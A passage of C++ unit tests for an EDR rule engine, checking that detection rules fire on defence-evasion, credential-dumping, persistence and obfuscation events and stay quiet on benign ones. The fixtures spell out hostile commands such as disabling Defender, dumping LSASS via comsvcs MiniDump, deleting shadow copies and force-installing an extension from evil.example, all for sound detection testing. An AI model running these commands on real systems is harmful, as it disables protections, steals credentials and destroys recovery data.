// RuleEngine matches fields, not detectors; the stamping itself is
// covered by the detector suites.
static void TestTamperDumpProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    {
        // EDR-344: av_tamper_score 90 -> fires; below band silent.
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] =
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        event.fields[field::kCommandLine] =
            "Set-MpPreference -DisableRealtimeMonitoring 1";
        event.fields[field::kAvTamperScore] = "90";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-344") != hits.end());
        hits.clear();
        event.fields[field::kAvTamperScore] = "45";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-344") == hits.end());

        // Registry-write variant fires on REG_WRITE too (rule has no
        // type filter beyond the score band).
        hits.clear();
        Event reg;
        reg.type = EDR_EVT_REG_WRITE;
        reg.fields[field::kType] = "REG_WRITE";
        reg.fields[field::kRegKey] =
            "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender";
        reg.fields[field::kRegValue] = "DisableAntiSpyware";
        reg.fields[field::kAvTamperScore] = "85";
        engine.OnEvent(reg);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-344") != hits.end());
    }
    {
        // EDR-345: timestomp_score 85 -> fires; below band silent.
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = "C:\\temp\\timestomp.exe";
        event.fields[field::kCommandLine] =
            "timestomp.exe backdoor.exe /set M:12";
        event.fields[field::kTimestompScore] = "85";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-345") != hits.end());
        hits.clear();
        event.fields[field::kTimestompScore] = "45";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-345") == hits.end());

        // Ordinary command without a score never fires it.
        hits.clear();
        Event clean;
        clean.type = EDR_EVT_PROCESS_START;
        clean.fields[field::kType] = "PROCESS_START";
        clean.fields[field::kImage] =
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        clean.fields[field::kCommandLine] =
            "Get-ChildItem C:\\logs | Sort LastWriteTime";
        engine.OnEvent(clean);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-345") == hits.end());
    }
    {
        // EDR-346: lsass_dump_score 90 -> fires; below band silent.
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] =
            "C:\\Windows\\System32\\rundll32.exe";
        event.fields[field::kCommandLine] =
            "rundll32 comsvcs.dll, MiniDump 716 out.dmp full";
        event.fields[field::kLsassDumpScore] = "90";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-346") != hits.end());
        hits.clear();
        event.fields[field::kLsassDumpScore] = "40";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-346") == hits.end());

        // Benign rundll32 without a score never fires it.
        hits.clear();
        Event clean;
        clean.type = EDR_EVT_PROCESS_START;
        clean.fields[field::kType] = "PROCESS_START";
        clean.fields[field::kImage] =
            "C:\\Windows\\System32\\rundll32.exe";
        clean.fields[field::kCommandLine] =
            "rundll32 shell32.dll,Control_RunDLL desk.cpl";
        engine.OnEvent(clean);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-346") == hits.end());
    }
}

static void TestObfuscationProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    {
        // EDR-411: obfuscation_score 55 hits, 54 silent (house band 55+)
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        event.fields[field::kCommandLine] = "powershell -enc AAAA";
        event.fields[field::kObfuscationScore] = "55";
        event.fields[field::kObfuscationHardSignal] = "true";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-411") != hits.end());
        hits.clear();
        event.fields[field::kObfuscationScore] = "54";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-411") == hits.end());
        hits.clear();
        event.fields[field::kObfuscationScore] = "100";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-411") != hits.end());
        hits.clear();
        event.fields[field::kObfuscationScore] = "90";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-411") != hits.end());
        // clean without score silent
        hits.clear();
        Event clean;
        clean.type = EDR_EVT_PROCESS_START;
        clean.fields[field::kType] = "PROCESS_START";
        clean.fields[field::kImage] = "C:\\Windows\\System32\\cmd.exe";
        clean.fields[field::kCommandLine] = "cmd /c dir";
        engine.OnEvent(clean);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-411") == hits.end());

        // PS_SCRIPT variant also hits (script_block_text)
        hits.clear();
        Event scr;
        scr.type = EDR_EVT_POWERSHELL_SCRIPT;
        scr.fields[field::kType] = "POWERSHELL_SCRIPT";
        scr.fields[field::kScriptBlockText] = "FromBase64String('AAAA')";
        scr.fields[field::kObfuscationScore] = "85";
        scr.fields[field::kObfuscationHardSignal] = "true";
        engine.OnEvent(scr);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-411") == hits.end());
        CHECK(std::find(hits.begin(), hits.end(), "EDR-412") != hits.end());
        hits.clear();
        scr.fields[field::kObfuscationScore] = "54";
        engine.OnEvent(scr);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-411") == hits.end());

        // EDR-412 also mirrors 55 boundary
        hits.clear();
        Event ev2;
        ev2.type = EDR_EVT_POWERSHELL_SCRIPT;
        ev2.fields[field::kType] = "POWERSHELL_SCRIPT";
        ev2.fields[field::kObfuscationScore] = "55";
        ev2.fields[field::kObfuscationHardSignal] = "true";
        engine.OnEvent(ev2);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-412") != hits.end());
        hits.clear();
        ev2.fields[field::kObfuscationScore] = "54";
        engine.OnEvent(ev2);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-412") == hits.end());
    }
}

// EDR-413/414/415 (WSL abuse T1202 / MSDT abuse T1203 / ISO mount T1553.005):
// the production rules must fire on the 55+ house band and stay silent below it.
static void TestWslMsdtIsoProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    {
        // EDR-413: wsl_abuse_score 90 hits, 54 silent.
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = "C:\\Windows\\System32\\wsl.exe";
        event.fields[field::kCommandLine] = "wsl --exec powershell.exe -enc AAAA";
        event.fields[field::kWslAbuseScore] = "90";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-413") != hits.end());
        hits.clear();
        event.fields[field::kWslAbuseScore] = "54";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-413") == hits.end());
        // Benign wsl without a score never fires it.
        hits.clear();
        Event clean;
        clean.type = EDR_EVT_PROCESS_START;
        clean.fields[field::kType] = "PROCESS_START";
        clean.fields[field::kImage] = "C:\\Windows\\System32\\wsl.exe";
        clean.fields[field::kCommandLine] = "wsl --list --verbose";
        engine.OnEvent(clean);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-413") == hits.end());
    }
    {
        // EDR-414: msdt_abuse_score 90 hits, 54 silent.
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = "C:\\Windows\\System32\\msdt.exe";
        event.fields[field::kCommandLine] = "msdt.exe ms-msdt:/id PCWDiagnostic /skip force";
        event.fields[field::kMsdtAbuseScore] = "90";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-414") != hits.end());
        hits.clear();
        event.fields[field::kMsdtAbuseScore] = "54";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-414") == hits.end());
        // Benign msdt without a score never fires it.
        hits.clear();
        Event clean;
        clean.type = EDR_EVT_PROCESS_START;
        clean.fields[field::kType] = "PROCESS_START";
        clean.fields[field::kImage] = "C:\\Windows\\System32\\msdt.exe";
        clean.fields[field::kCommandLine] = "msdt.exe";
        engine.OnEvent(clean);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-414") == hits.end());
    }
    {
        // EDR-415: iso_mount_score 90 hits, 54 silent.
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";
        event.fields[field::kCommandLine] = "powershell Mount-DiskImage -ImagePath C:\\Users\\Public\\evil.iso";
        event.fields[field::kIsoMountScore] = "90";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-415") != hits.end());
        hits.clear();
        event.fields[field::kIsoMountScore] = "54";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-415") == hits.end());
        // Read-only dism inspection without a score never fires it.
        hits.clear();
        Event clean;
        clean.type = EDR_EVT_PROCESS_START;
        clean.fields[field::kType] = "PROCESS_START";
        clean.fields[field::kImage] = "C:\\Windows\\System32\\Dism.exe";
        clean.fields[field::kCommandLine] = "dism /get-imageinfo /imagefile:C:\\images\\tools.iso";
        engine.OnEvent(clean);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-415") == hits.end());
    }
}

// EDR-348 (shadow-copy suppression T1490): the production rule must fire
// on the shadow-copy score band and stay silent below it.
static void TestShadowCopyProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    {
        // EDR-348: shadow_copy_score 90 -> fires.
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] =
            "C:\\Windows\\System32\\vssadmin.exe";
        event.fields[field::kCommandLine] =
            "vssadmin delete shadows /all /quiet";
        event.fields[field::kShadowCopyScore] = "90";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-348") != hits.end());

        // Below the 55 threshold must not fire.
        hits.clear();
        event.fields[field::kShadowCopyScore] = "45";
        engine.OnEvent(event);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-348") == hits.end());

        // A clean process start without a score never fires it.
        hits.clear();
        Event clean;
        clean.type = EDR_EVT_PROCESS_START;
        clean.fields[field::kType] = "PROCESS_START";
        clean.fields[field::kImage] =
            "C:\\Windows\\System32\\vssadmin.exe";
        clean.fields[field::kCommandLine] = "vssadmin list shadows";
        engine.OnEvent(clean);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-348") == hits.end());
    }
}

// EDR-406/407: as_rep_roast_score and persist_burst_score bands must
// fire their production rules and stay silent below them.
static void TestNewCredentialPersistenceRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    {
        // EDR-406: as_rep_roast_score 80 -> fires.
        hits.clear();
        Event roast;
        roast.type = EDR_EVT_LOGON;
        roast.fields[field::kType] = "LOGON";
        roast.fields[field::kOperationType] = "TGT_REQUEST";
        roast.fields[field::kAsRepRoastScore] = "80";
        engine.OnEvent(roast);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-406") != hits.end());

        // Below threshold must not fire.
        hits.clear();
        roast.fields[field::kAsRepRoastScore] = "50";
        engine.OnEvent(roast);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-406") == hits.end());

        // A plain logon without a score never fires it.
        hits.clear();
        Event plainLogon;
        plainLogon.type = EDR_EVT_LOGON;
        plainLogon.fields[field::kType] = "LOGON";
        plainLogon.fields[field::kOperationType] = "LOGON_SUCCESS";
        engine.OnEvent(plainLogon);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-406") == hits.end());
    }
    {
        // EDR-407: persist_burst_score 75 -> fires.
        hits.clear();
        Event burst;
        burst.type = EDR_EVT_SERVICE_CHANGE;
        burst.fields[field::kType] = "SERVICE_CHANGE";
        burst.fields[field::kServiceName] = "Updater";
        burst.fields[field::kServiceAction] = "added";
        burst.fields[field::kPersistBurstScore] = "75";
        engine.OnEvent(burst);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-407") != hits.end());

        // Below threshold must not fire.
        hits.clear();
        burst.fields[field::kPersistBurstScore] = "35";
        engine.OnEvent(burst);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-407") == hits.end());

        // A clean service event without a score never fires it.
        hits.clear();
        Event clean;
        clean.type = EDR_EVT_SERVICE_CHANGE;
        clean.fields[field::kType] = "SERVICE_CHANGE";
        clean.fields[field::kServiceName] = "Svc";
        clean.fields[field::kServiceAction] = "added";
        engine.OnEvent(clean);
        CHECK(std::find(hits.begin(), hits.end(), "EDR-407") == hits.end());
    }
}

// EDR-353/354 (T1176): suspicious scores remain medium while malicious
// scores cross the high-severity production boundary.
static void TestBrowserExtensionProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::pair<std::string, std::string>> hits;
    engine.SetAlertCallback(
        [&](const Alert& alert) {
            hits.emplace_back(alert.ruleId, alert.severity);
        });
    const auto has = [&](const char* id, const char* severity) {
        return std::find(hits.begin(), hits.end(),
                         std::make_pair(std::string(id),
                                        std::string(severity))) != hits.end();
    };

    Event process;
    process.type = EDR_EVT_PROCESS_START;
    process.fields[field::kType] = "PROCESS_START";
    process.fields[field::kImage] =
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    process.fields[field::kCommandLine] =
        "chrome.exe --load-extension=C:\\Users\\alice\\AppData\\Local\\ext";
    process.fields[field::kBrowserExtensionScore] = "60";
    engine.OnEvent(process);
    CHECK(has("EDR-353", "medium"));
    CHECK(!has("EDR-354", "high"));

    hits.clear();
    process.fields[field::kBrowserExtensionScore] = "90";
    engine.OnEvent(process);
    CHECK(!has("EDR-353", "medium"));
    CHECK(has("EDR-354", "high"));

    hits.clear();
    process.fields[field::kBrowserExtensionScore] = "54";
    engine.OnEvent(process);
    CHECK(hits.empty());

    hits.clear();
    Event registry;
    registry.type = EDR_EVT_REG_WRITE;
    registry.fields[field::kType] = "REG_WRITE";
    registry.fields[field::kRegKey] =
        "HKLM\\SOFTWARE\\Policies\\Google\\Chrome"
        "\\ExtensionInstallForcelist\\1";
    registry.fields[field::kRegValue] =
        "abcdefghijklmnopabcdefghijklmnop;https://evil.example/update.xml";
    registry.fields[field::kBrowserExtensionScore] = "85";
    engine.OnEvent(registry);
    CHECK(!has("EDR-353", "medium"));
    CHECK(has("EDR-354", "high"));

    hits.clear();
    Event clean;
    clean.type = EDR_EVT_PROCESS_START;
    clean.fields[field::kType] = "PROCESS_START";
    clean.fields[field::kImage] =
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe";
    clean.fields[field::kCommandLine] = "chrome.exe https://intranet/";
    engine.OnEvent(clean);
    CHECK(hits.empty());
}
// EDR-355..EDR-359 (T1137 / T1547.009 / T1202 / T1546.002 / T1574.009/.010):
// the five new detectors are opt-in; the production rules fire on the
// *_score bands the detectors stamp. Below 55 must stay silent.
static void TestNewPersistExecProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback(
        [&](const Alert& alert) { hits.push_back(alert.ruleId); });
    auto scored = [&](const char* id, const char* field, const char* score) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = "C:\\Windows\\System32\\cmd.exe";
        event.fields[field] = score;
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };

    CHECK(scored("EDR-355", field::kOfficePersistScore, "90"));
    CHECK(scored("EDR-355", field::kOfficePersistScore, "75"));
    CHECK(scored("EDR-356", field::kShortcutPersistScore, "90"));
    CHECK(scored("EDR-356", field::kShortcutPersistScore, "65"));
    CHECK(!scored("EDR-356", field::kShortcutPersistScore, "50"));
    CHECK(scored("EDR-357", field::kIndirectExecScore, "90"));
    CHECK(scored("EDR-357", field::kIndirectExecScore, "70"));
    CHECK(!scored("EDR-357", field::kIndirectExecScore, "55") == false);
    CHECK(!scored("EDR-357", field::kIndirectExecScore, "54"));
    CHECK(scored("EDR-358", field::kScreensaverPersistScore, "90"));
    CHECK(scored("EDR-358", field::kScreensaverPersistScore, "85"));
    CHECK(scored("EDR-358", field::kScreensaverPersistScore, "75"));
    CHECK(!scored("EDR-358", field::kScreensaverPersistScore, "54"));
    CHECK(scored("EDR-359", field::kSvcPathAbuseScore, "90"));
    CHECK(scored("EDR-359", field::kSvcPathAbuseScore, "85"));
    CHECK(scored("EDR-359", field::kSvcPathAbuseScore, "80"));
    CHECK(!scored("EDR-359", field::kSvcPathAbuseScore, "54"));
    /* EDR-360 (T1546.013 PowerShell profile): 55+ alerted incl. the
     * 60 recon band; 54 must stay silent. */
    CHECK(scored("EDR-360", field::kPsProfileScore, "95"));
    CHECK(scored("EDR-360", field::kPsProfileScore, "75"));
    CHECK(scored("EDR-360", field::kPsProfileScore, "60"));
    CHECK(!scored("EDR-360", field::kPsProfileScore, "54"));
}

// Watcher/rule alignment: every value-filtered registry-watcher target must
// have at least one production rule matching the exact reg_key shape the
// watcher emits (prefix + "\" + valueName, with one subkey component inserted
// for watchSubtree targets such as IFEO\<image>\Debugger and
// SilentProcessExit\<process>\MonitorProcess). This guards against the watcher
// target list and the rule battery drifting apart — the EDR-296/297/298 path
// split (UserAuthentication under WinStations\RDP-Tcp, DisableRestrictedAdmin
// under Control\Lsa, not the Terminal Server root key) is exactly the class
// of divergence this test catches.
static void TestRegWatchTargetRuleAlignment() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });

    const std::vector<RegWatchTargetSummary>& targets = RegWatchTargetSummaries();
    CHECK(!targets.empty());
    size_t checked = 0;
    for (const RegWatchTargetSummary& target : targets) {
        if (target.valueNames.empty()) continue;  // unfiltered targets have no value-name rule contract
        for (const std::string& value : target.valueNames) {
            std::string key = target.prefix + "\\" + value;
            if (target.watchSubtree) {
                // One subkey level is flattened: IFEO\<image>\Debugger,
                // SilentProcessExit\<process>\MonitorProcess.
                key = target.prefix + "\\notepad.exe\\" + value;
            }
            hits.clear();
            Event event;
            event.type = EDR_EVT_REG_WRITE;
            event.fields[field::kType] = "REG_WRITE";
            event.fields[field::kRegKey] = key;
            event.fields[field::kRegValue] = "1";
            engine.OnEvent(event);
            if (hits.empty())
                std::cerr << "watcher/rule alignment: no rule for " << key << "\n";
            CHECK(!hits.empty());
            ++checked;
        }
    }
    // Winlogon(Shell,Userinit) + IFEO(Debugger) + WDigest(UseLogonCredential) +
    // SilentProcessExit(MonitorProcess) + TS root(fDenyTSConnections,
    // fSingleSessionPerUser) + RDP-Tcp(UserAuthentication) + Lsa(
    // DisableRestrictedAdmin) + Installer(AlwaysInstallElevated, HKLM + HKCU).
    CHECK(checked == 11);
}

// Defense-evasion production rules (EDR-224..EDR-237, T1562 series). The
// process rules run on default collectors (PROCESS_START carries image +
// command line from ETW/poll/imonitor/sysmon); the REG_WRITE rules
// (EDR-231/232/237) realistically need Sysmon IDs 12-14 because neither the
// registry watcher nor the driver interest list covers those paths; EDR-234
// (BYOVD) needs an image-load source (driver image callback or ETW image load).
static void TestDefenseEvasionProductionRules() {
    RuleEngine engine;
    engine.LoadFromFile("..\\rules\\rules.json");
    std::vector<std::string> hits;
    engine.SetAlertCallback([&](const Alert& alert) { hits.push_back(alert.ruleId); });
    auto proc = [&](const char* id, const char* image, const char* command) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_PROCESS_START;
        event.fields[field::kType] = "PROCESS_START";
        event.fields[field::kImage] = image;
        event.fields[field::kCommandLine] = command;
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };
    const char* kPs = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe";

    // EDR-224: Defender exclusion added via PowerShell.
    CHECK(proc("EDR-224", kPs,
               "powershell -NoProfile -Command Add-MpPreference -ExclusionPath C:\\Users\\Public\\Evil"));
    CHECK(!proc("EDR-224", kPs,
                "powershell -Command Add-MpPreference -ThreatIDDefaultAction_Ids 1 -Force"));
    // EDR-225: Set-MpPreference disables real-time monitoring features.
    CHECK(proc("EDR-225", kPs,
               "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\""));
    CHECK(!proc("EDR-225", kPs, "powershell -c \"Set-MpPreference -MAPSReporting 0\""));
    // EDR-226: tamper protection off (critical).
    CHECK(proc("EDR-226", kPs,
               "powershell -c \"Set-MpPreference -DisableTamperProtection $true\""));
    CHECK(!proc("EDR-226", kPs,
                "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true\""));
    // EDR-227: telemetry reduction (log action; still evaluated).
    CHECK(proc("EDR-227", kPs, "powershell -c \"Set-MpPreference -PUAProtection 0\""));
    CHECK(!proc("EDR-227", kPs, "powershell -c \"Set-MpPreference -PUAProtection 1\""));
    // EDR-228: stop/disable security-product services.
    CHECK(proc("EDR-228", "C:\\Windows\\System32\\sc.exe", "sc stop WinDefend"));
    CHECK(proc("EDR-228", "C:\\Windows\\System32\\sc.exe", "sc config WinDefend start= disabled"));
    CHECK(proc("EDR-228", "C:\\Windows\\System32\\net.exe", "net stop SecurityHealthService"));
    CHECK(proc("EDR-228", "C:\\Windows\\System32\\cmd.exe", "cmd /c sc stop Sense"));
    CHECK(!proc("EDR-228", "C:\\Windows\\System32\\sc.exe", "sc config WinDefend start= auto"));
    CHECK(!proc("EDR-228", "C:\\Windows\\System32\\sc.exe", "sc query WinDefend"));
    // EDR-229: kill security-product processes.
    CHECK(proc("EDR-229", "C:\\Windows\\System32\\taskkill.exe", "taskkill /f /im MsMpEng.exe"));
    CHECK(proc("EDR-229", "C:\\Windows\\System32\\wbem\\wmic.exe",
               "wmic process where name=\"MsMpEng.exe\" delete"));
    CHECK(!proc("EDR-229", "C:\\Windows\\System32\\taskkill.exe", "taskkill /f /im notepad.exe"));
    // EDR-230: Sysmon unload/disable.
    CHECK(proc("EDR-230", "C:\\Windows\\System32\\sysmon64.exe", "Sysmon64 -u"));
    CHECK(proc("EDR-230", "C:\\Windows\\System32\\sc.exe", "sc stop Sysmon"));
    CHECK(!proc("EDR-230", "C:\\Windows\\System32\\sysmon64.exe", "Sysmon64 -accepteula -i"));
    // EDR-233: firewall disabled via PowerShell.
    CHECK(proc("EDR-233", kPs,
               "powershell -c \"Set-NetFirewallProfile -Profile Domain -Enabled False\""));
    CHECK(!proc("EDR-233", kPs, "powershell -c \"Get-NetFirewallProfile\""));
    // EDR-235: shadow-copy deletion.
    CHECK(proc("EDR-235", "C:\\Windows\\System32\\wbem\\wmic.exe", "wmic shadowcopy delete"));
    CHECK(!proc("EDR-235", "C:\\Windows\\System32\\wbem\\wmic.exe", "wmic shadowcopy list brief"));
    // EDR-236: audit policy disabled or cleared.
    CHECK(proc("EDR-236", "C:\\Windows\\System32\\auditpol.exe",
               "auditpol /set /subcategory:\"Process Creation\" /success:disable /failure:disable"));
    CHECK(!proc("EDR-236", "C:\\Windows\\System32\\auditpol.exe",
                "auditpol /get /subcategory:\"Process Creation\""));
    CHECK(proc("EDR-472", "C:\\Windows\\System32\\sc.exe",
               "sc config EventLog start= disabled"));
    CHECK(!proc("EDR-472", "C:\\Windows\\System32\\sc.exe",
                "sc config EventLog start= auto"));
    CHECK(!proc("EDR-472", "C:\\Tools\\fake-sc.exe",
                "sc config EventLog start= disabled"));
    CHECK(proc("EDR-473", kPs,
               "powershell -Command \"Set-Service -Name EventLog -StartupType Disabled\""));
    CHECK(!proc("EDR-473", kPs,
                "powershell -Command \"Get-Service -Name EventLog\""));
    CHECK(!proc("EDR-473", kPs,
                "powershell -Command \"Set-Service -Name Spooler -StartupType Disabled\""));

    auto reg = [&](const char* id, const char* key) {
        hits.clear();
        Event event;
        event.type = EDR_EVT_REG_WRITE;
        event.fields[field::kType] = "REG_WRITE";
        event.fields[field::kRegKey] = key;
        engine.OnEvent(event);
        return std::find(hits.begin(), hits.end(), id) != hits.end();
    };
    // EDR-231: Defender tamper-protection registry.
    CHECK(reg("EDR-231",
              "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Features\\TamperProtection"));
    CHECK(!reg("EDR-231",
               "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring"));
    // EDR-232: AMSI disable.
    CHECK(reg("EDR-232", "HKLM\\SOFTWARE\\Microsoft\\AMSI\\DisableScriptScanning"));
    CHECK(!reg("EDR-232",
               "HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Real-Time Protection\\DisableRealtimeMonitoring"));
    // EDR-237: LSA protection disable.
    CHECK(reg("EDR-237", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\RunAsPPL"));
    CHECK(!reg("EDR-237", "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\SecurityPackages"));

    // EDR-234: BYOVD vulnerable driver load.
    hits.clear();
    Event img;
    img.type = EDR_EVT_IMAGE_LOAD;
    img.fields[field::kType] = "IMAGE_LOAD";
    img.fields[field::kImageLoadType] = "load";
    img.fields[field::kImageLoaded] = "C:\\Windows\\System32\\drivers\\RTCore64.sys";
    engine.OnEvent(img);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-234") != hits.end());
    hits.clear();
    img.fields[field::kImageLoaded] = "C:\\Windows\\System32\\drivers\\avgntflt.sys";
    engine.OnEvent(img);
    CHECK(std::find(hits.begin(), hits.end(), "EDR-234") == hits.end());
}

// ----- Startup Folder Watch Tests -----

static void WriteStartupWatchConfig(const char* data) {
    std::ofstream out("edr-native-startup-watch-config.json", std::ios::binary);
    out << data;
}

static void TestStartupWatchConfig() {
    Config defaults;
    CHECK(!defaults.enableStartupWatch);
    CHECK(defaults.startupWatchDirs.empty());
    std::string error;
    WriteStartupWatchConfig(
        R"({"enable_startup_watch":true,"startup_watch_dirs":["%TEMP%\\edr-sw-cfg","C:\\Tools\\Startup"]})");
    Config config;
    CHECK(LoadConfigFile("edr-native-startup-watch-config.json", config, error));
    CHECK(config.enableStartupWatch);
    CHECK(config.startupWatchDirs.size() == 2);
    /* %TEMP% entries are env-expanded at load time. */
    CHECK(config.startupWatchDirs[0].find('%') == std::string::npos);
    CHECK(config.startupWatchDirs[0].find("edr-sw-cfg") != std::string::npos);
    CHECK(config.startupWatchDirs[1] == "C:\\Tools\\Startup");
    for (const char* value : {
        R"({"enable_startup_watch":"yes"})",
        R"({"startup_watch_dirs":"C:\\x"})",
        R"({"startup_watch_dirs":[1]})"}) {
        WriteStartupWatchConfig(value);
        Config unchanged;
        unchanged.startupWatchDirs.push_back("sentinel");
        CHECK(!LoadConfigFile("edr-native-startup-watch-config.json",
                              unchanged, error));
        CHECK(!unchanged.enableStartupWatch);
        CHECK(unchanged.startupWatchDirs.size() == 1 &&
              unchanged.startupWatchDirs[0] == "sentinel");
    }
    DeleteFileA("edr-native-startup-watch-config.json");
}

static void TestStartupDirectoryCanonicalDedupe() {
    wchar_t temp[MAX_PATH] = {};
    CHECK(GetTempPathW(MAX_PATH, temp) != 0);
    std::wstring root = std::wstring(temp) + L"edr-startup-dedupe-" +
        std::to_wstring(GetCurrentProcessId());
    CreateDirectoryW(root.c_str(), nullptr);
    std::vector<StartupDirectory> input = {
        {root, false}, {root + L"\\.", false}, {root + L"\\", false}};
    auto result = CanonicalStartupDirectories(input, true);
    CHECK(result.size() == 1 && !result.front().second);
    RemoveDirectoryW(root.c_str());
}

static void TestProfileListDiscovery() {
    wchar_t temp[MAX_PATH] = {};
    CHECK(GetTempPathW(MAX_PATH, temp) != 0);
    std::wstring profilesRoot = std::wstring(temp) + L"edr-profile-test-" +
        std::to_wstring(GetCurrentProcessId());
    std::wstring profile = profilesRoot + L"\\registered";
    std::wstring startup = profile + L"\\AppData\\Roaming\\Microsoft\\Windows" \
        L"\\Start Menu\\Programs\\Startup";
    CreateDirs(startup);
    std::wstring fallbackProfile = profilesRoot + L"\\fallback";
    std::wstring fallbackStartup = fallbackProfile +
        L"\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";
    CreateDirs(fallbackStartup);
    std::wstring registryPath = L"Software\\edr-profile-list-test-" +
        std::to_wstring(GetCurrentProcessId());
    HKEY root = nullptr;
    CHECK(RegCreateKeyExW(HKEY_CURRENT_USER, registryPath.c_str(), 0, nullptr, 0,
        KEY_ALL_ACCESS, nullptr, &root, nullptr) == ERROR_SUCCESS);
    CHECK(RegSetValueExW(root, L"ProfilesDirectory", 0, REG_EXPAND_SZ,
        reinterpret_cast<const BYTE*>(profilesRoot.c_str()),
